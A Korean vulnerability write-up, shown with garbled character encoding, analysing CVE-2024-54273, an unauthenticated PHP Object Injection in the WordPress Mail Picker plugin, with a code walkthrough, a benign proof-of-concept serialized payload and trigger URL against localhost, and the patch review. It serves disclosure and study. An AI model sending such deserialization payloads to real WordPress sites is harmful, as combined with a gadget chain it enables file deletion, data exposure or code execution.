---
title: "[CVE-2024-54273] ì·¨ì•½ì  ë¶„ì„ ë³´ê³ ì„œ"
description: "WordPress í”ŒëŸ¬ê·¸ì¸ Mail Picker ë²„ì „ 1.0.14 ì´í•˜ì—ì„œ ë°œìƒí•œ PHP Object Injection ì·¨ì•½ì "
author: dottak
date: 2024-12-23 14:51:00 +0900
categories: [One-Day ë¶„ì„, WordPress]
tags: [ë¹¡ê³µíŒŸ, ì½˜í…ŒìŠ¤íŠ¸ ë„¤ë·¸ë¼, WordPress, CVE, PHP Object Injection]
image: assets/img/wordpress-thumbnail.png
exclude_img: true
---

## ğŸ“Œ Analysis

### 1. ê°œìš”

CVE-2024-54273 ì—ì„œëŠ” WordPress í”ŒëŸ¬ê·¸ì¸ Mail Picker ë²„ì „ 1.0.14 ì´í•˜ì—ì„œ PHP Object Injection ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. Mail Picker í”ŒëŸ¬ê·¸ì¸ì€ ì´ë©”ì¼ì„ í†µí•œ ë§ˆì¼€íŒ… ë° ë‰´ìŠ¤ë ˆí„° ë°œì†¡ì„ ì§€ì›í•˜ëŠ” í”ŒëŸ¬ê·¸ì¸ìœ¼ë¡œ, í•´ë‹¹ í”ŒëŸ¬ê·¸ì¸ì—ì„œëŠ” ì•Œë ¤ì§„ POP Chainì´ ì—†ìœ¼ë‚˜ ì›Œë“œí”„ë ˆìŠ¤ ì‚¬ì´íŠ¸ì— ì¶”ê°€ í”ŒëŸ¬ê·¸ì¸ ë° í…Œë§ˆì— POP Chainì´ ìˆëŠ” ê²½ìš° ê³µê²©ìëŠ” í•´ë‹¹ ì·¨ì•½ì ì„ í†µí•´ ì„ì˜ íŒŒì¼ ì‚­ì œ, ë¯¼ê° ë°ì´í„° ë…¸ì¶œ, ì½”ë“œ ì‹¤í–‰ ë“± ì•…ì˜ì ì¸ í–‰ìœ„ë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### 2. ë¶„ì„ ì¤€ë¹„

Mail Picker í”ŒëŸ¬ê·¸ì¸ì€ êµ¬ë… í¼ ìƒì„± í˜ì´ì§€(`/wp-admin/post-new.php?post_type=subscriber_form`)ì—ì„œ í¼ì„ ìƒì„±í•  ë•Œ, í¼ì„ ì‚½ì…í•  ìˆ˜ ìˆëŠ” Shortcode(`[mail_picker_form id='7']`)ë¥¼ í™•ì¸í•˜ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](assets/posts/one-day/2024-12-23/image-001.png)

í•´ë‹¹ ì´ë©”ì¼ êµ¬ë… í¼ì„ ìƒì„±í•  ë•ŒëŠ” reCaptcha ì˜µì…˜ì„ ë¹„í™œì„±í™” í•˜ê³  í¼ ë‚´ ì…ë ¥ ê°’ì„ ì´ë©”ì¼(`subscriber_email`), í•¸ë“œí° ë²ˆí˜¸(`subscriber_phone`)ë¥¼ ì„ íƒí•©ë‹ˆë‹¤.

![image](assets/posts/one-day/2024-12-23/image-002.png)

ìœ„ì™€ ê°™ì´ ë§Œë“¤ì–´ì§„ ì´ë©”ì¼ êµ¬ë… í¼ì€ í¬ìŠ¤íŠ¸ ë˜ëŠ” í˜ì´ì§€ë¥¼ ìƒì„±í•  ë•Œ, Short Codeë¡œ ì…ë ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](assets/posts/one-day/2024-12-23/image-003.png)

ì´ë ‡ê²Œ ë§Œë“¤ì–´ì§„ ê¸€ì€ ê³µê°œ ì‹œ ì•„ë˜ì˜ ì´ë©”ì¼ êµ¬ë… í¼ìœ¼ë¡œ ì™„ì„±ë©ë‹ˆë‹¤.

![image](assets/posts/one-day/2024-12-23/image-004.png)

### 3. ì·¨ì•½ì  ë¶„ì„

ì´ë©”ì¼ êµ¬ë… í¼ì— ê° ì…ë ¥ í¼(ì´ë©”ì¼, í•¸ë“œí° ë²ˆí˜¸)ì— ë§ëŠ” ë°ì´í„°ë¥¼ ì…ë ¥í•˜ê³  ì œì¶œ(Submit)ì„ ìˆ˜í–‰í•  ê²½ìš° í˜„ì¬ í˜ì´ì§€ì˜ URLë¡œ í¼ ìš”ì²­(POST ë©”ì†Œë“œ ìš”ì²­)ì´ ë°œìƒí•©ë‹ˆë‹¤.

![image](assets/posts/one-day/2024-12-23/image-005.png)

ì´ë•Œ Mail Picker í”ŒëŸ¬ê·¸ì¸ì˜ `/wp-content/plugins/mail-picker/templates/mail-picker-form/mail-picker-form.php` íŒŒì¼ì—ì„œëŠ” ì•„ë˜ì˜ ê³¼ì •ì„ í†µí•´ URL íŒŒë¼ë¯¸í„° `mail_picker_action=add_subscriber`, `formFieldData=<base64 ì¸ì½”ë”© ë°ì´í„°>`, `subscriber_status=pending` ë¥¼ ê°€ì§€ëŠ” URLë¡œ GET ìš”ì²­ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.

ì´ ì¤‘ URL íŒŒë¼ë¯¸í„° `formFieldData` ëŠ” ì•„ë˜ì˜ ê³¼ì •ì„ í†µí•´ ì„¤ì •ë©ë‹ˆë‹¤.

1. ì…ë ¥ í¼ì—ì„œ ì‚¬ìš©ìê°€ ì…ë ¥í•œ ë°ì´í„°ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.
2. ê°€ì ¸ì˜¨ ë°ì´í„°ë¥¼ PHPì˜ serialize í•¨ìˆ˜ë¡œ ì§ë ¬í™”í•©ë‹ˆë‹¤.
3. ì§ë ¬í™”ëœ ë°ì´í„°ëŠ” base64 ë°©ì‹ìœ¼ë¡œ ì¸ì½”ë”©ë©ë‹ˆë‹¤.
4. ì¸ì½”ë”©ëœ ë°ì´í„°ë¥¼ URL íŒŒë¼ë¯¸í„° `formFieldData`ì˜ ê°’ìœ¼ë¡œ ì„¤ì •í•©ë‹ˆë‹¤.

![image](assets/posts/one-day/2024-12-23/image-006.png)

ì´ì–´ì„œ GET ìš”ì²­ URLì€ URL íŒŒë¼ë¯¸í„° `mail_picker_action=add_subscriber` ì— ì˜í•´ `web/app/wp-content/plugins/mail-picker/includes/classes/class-manage-subscriber.php` ì˜ `add_subscriber` í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. 

ì´ë•Œ, í•´ë‹¹ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ë•Œ ì•„ë˜ì˜ ë‘ ê°€ì§€ ë¬¸ì œê°€ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤.

- ì²« ë²ˆì§¸, ìš”ì²­ì„ ìˆ˜í–‰í•œ ì‚¬ìš©ìì— ëŒ€í•œ ê¶Œí•œ ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•˜ì§€ ì•ŠëŠ”ë‹¤.
- ë‘ ë²ˆì§¸, URL íŒŒë¼ë¯¸í„° `formFiledData` ì— ëŒ€í•œ ì—­ì§ë ¬í™”ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤.

![image](assets/posts/one-day/2024-12-23/image-007.png)

ë”°ë¼ì„œ, ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìê°€ Base64ë¡œ ì¸ì½”ë”©ëœ ì§ë ¬í™”ëœ ë°ì´í„°ë¥¼ URL `?mail_picker_action=add_subscriber&formFieldData=<base64 ì¸ì½”ë”© ë°ì´í„°>&subscriber_status=pending` ì—ì„œ URL íŒŒë¼ë¯¸í„° `formFieldData` ì— ì‚½ì…í•  ê²½ìš° Base64ë¡œ ë””ì½”ë”© ëœ ë‹¤ìŒ í•¨ìˆ˜ `unserialize` ì— ì˜í•´ ì—­ì§ë ¬í™”ë¥¼ ìˆ˜í–‰í•˜ë¯€ë¡œ Base64ë¡œ ë””ì½”ë”©ëœ ê°’ì— ì§ë ¬í™”ëœ ë°ì´í„°ê°€ ì‚½ì…ë  ê²½ìš° PHP Object Injection ì·¨ì•½ì ì´ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤.

## ğŸ“Œ PoC

### 1. POP Chain ì¤€ë¹„

ì•„ë˜ì˜ ì½”ë“œë¥¼ `wp-config.php` íŒŒì¼ ë‚´ í•˜ë‹¨ì— ì¶”ê°€í•©ë‹ˆë‹¤.

```php
class PoC_POP_Chain_Object {
	
	public $message = "";

	public function __destruct() {
		echo "<mark>Success PoP Chain</mark>";
		echo "<br>";
		echo "<mark>msg: ". $this->message ."</mark>";
	}
}
```

![image](assets/posts/one-day/2024-12-23/image-008.png)

### 2. ì§ë ¬í™”ëœ ë°ì´í„° ì¤€ë¹„

POP Chainì„ ìœ„í•´ ì¶”ê°€í•œ `PoC_POP_Chain_Object` í´ë˜ìŠ¤ì— `message` ê°€ `Exploit !!` ì¸ ê°ì²´ì˜ ì§ë ¬í™” ë°ì´í„°ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```
O:20:"PoC_POP_Chain_Object":1:{s:7:"message";s:10:"Exploit !!";}
```

ì´ ë°ì´í„°ë¥¼ Base64ë¡œ ë””ì½”ë”©í•˜ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```
TzoyMDoiUG9DX1BPUF9DaGFpbl9PYmplY3QiOjE6e3M6NzoibWVzc2FnZSI7czoxMDoiRXhwbG9pdCAhISI7fQ
```

### 3. Exploit

Base64ë¡œ ì¸ì½”ë”©ëœ `PoC_PoP_Chain_Object` í´ë˜ìŠ¤ ê°ì²´ì˜ ì§ë ¬í™” ë°ì´í„°ë¥¼ URL íŒŒë¼ë¯¸í„° `formFiledData`ì— ì‚½ì…í•©ë‹ˆë‹¤. ê·¸ë¦¬ê³  URL íŒŒë¼ë¯¸í„° `mail_picker_action`ì˜ ê°’ì„ `add_subscriber`ë¡œ, `subscriber_status`ì˜ ê°’ì„ `pending`ìœ¼ë¡œ ì„¤ì •í•©ë‹ˆë‹¤.

ì™„ì„±ëœ URLì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```
http://localhost:8080/?mail_picker_action=add_subscriber&formFieldData=TzoyMDoiUG9DX1BPUF9DaGFpbl9PYmplY3QiOjE6e3M6NzoibWVzc2FnZSI7czoxMDoiRXhwbG9pdCAhISI7fQ&subscriber_status=pending
```

ì´í›„ í•´ë‹¹ URLì— ì ‘ì†í•  ê²½ìš° ë‹¤ìŒê³¼ ê°™ì´ PHP Object Injection ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ POP Chainì´ ë™ì‘í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©°, ì§ë ¬í™”ëœ ê°ì²´ì˜ `message` ê°’ì¸ `Exploit !!`ì´ ì¶œë ¥ë©ë‹ˆë‹¤.

![image](assets/posts/one-day/2024-12-23/image-009.png)

## ğŸ“Œ íŒ¨ì¹˜ í™•ì¸

> https://plugins.trac.wordpress.org/changeset/3206691/mail-picker?old=3126661&old_path=%2Fmail-picker#file83
> 

1.0.14 ë²„ì „ ì´í•˜ì—ì„œëŠ” ì§ë ¬í™”ëœ ë°ì´í„°ë¥¼ base64ë¡œ ì¸ì½”ë”©í•˜ì—¬ ì§ë ¬í™”ëœ ë°ì´í„°ë¥¼ ì „ì†¡ í–ˆì§€ë§Œ íŒ¨ì¹˜ëœ 1.0.15 ë²„ì „ì—ì„œëŠ” ì§ë ¬í™” ë°ì´í„° ì—†ì´ ë°ì´í„°ë¥¼ ì§ì ‘ ì „ì†¡í•˜ë„ë¡ ë³€ê²½ë˜ì—ˆìŠµë‹ˆë‹¤.(`/wp-content/plugins/mail-picker/templates/mail-picker-form/mail-picker-form.php` íŒŒì¼ ë‚´ `mail_picker_form` í•¨ìˆ˜)

![image](assets/posts/one-day/2024-12-23/image-010.png)

ì´ì— ì·¨ì•½ì  íŠ¸ë¦¬ê±°ê°€ ë°œìƒí•˜ëŠ” ìœ„ì¹˜(`/wp-content/plugins/mail-picker/includes/classes/class-manage-subscriber.php` íŒŒì¼ ë‚´ `add_subscriber` í•¨ìˆ˜)ì—ì„œë„ ì—­ì§ë ¬í™” í•¨ìˆ˜ `unserialize` ë¥¼ ì œê±°í•˜ê³  ìš”ì²­ ë°ì´í„°ë¡œë¶€í„° ê°’ì„ ê·¸ëŒ€ë¡œ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ í™•ì¸í•˜ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](assets/posts/one-day/2024-12-23/image-011.png)

ë”°ë¼ì„œ, íŒ¨ì¹˜ ë²„ì „ 1.0.15 ë²„ì „ë¶€í„°ëŠ” ì‚¬ìš©ì ì…ë ¥ê°’ì„ ì§ë ¬í™”í•˜ì§€ ì•Šê³  ìˆœìˆ˜í•œ ë°ì´í„° í˜•íƒœë¡œ ì²˜ë¦¬í•¨ìœ¼ë¡œì¨ PHP Object Injection ì·¨ì•½ì ì„ ì›ì²œì ìœ¼ë¡œ ì°¨ë‹¨í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.